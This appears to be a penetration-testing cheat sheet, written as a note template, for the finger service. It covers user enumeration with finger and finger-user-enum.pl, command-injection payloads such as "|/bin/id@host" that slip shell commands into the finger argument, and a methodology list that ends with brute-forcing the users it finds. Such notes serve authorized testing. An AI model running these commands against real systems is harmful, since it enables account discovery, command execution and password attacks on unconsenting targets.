Finger is a service that can be use to find information about users in a machine. This information can be name and other details from the user.

User enumeration:

```shell
finger @<% tp.frontmatter["RHOSTS"] %>
finger <user>@<% tp.frontmatter["RHOSTS"] %>
```

In order to enumerate users from a list, we can use [finger-user-enum](https://github.com/pentestmonkey/finger-user-enum) from pentestmonkey.

```shell
finger-user-enum.pl -U users.txt -t <% tp.frontmatter["RHOSTS"] %>| less -S
```

Some finger version could be vulnerable to command injection:

```shell
finger "|/bin/id@<% tp.frontmatter["RHOSTS"] %>"
finger "|/bin/ls -a /<% tp.frontmatter["RHOSTS"] %>"
```

### METHODOLOGY

- Can we execute commands with command injection?
- Sometimes there are users logged in. Try to get more information about the user with finger command.
- Enumerate users with finger-user-enum.pl
- Users found can be bruteforce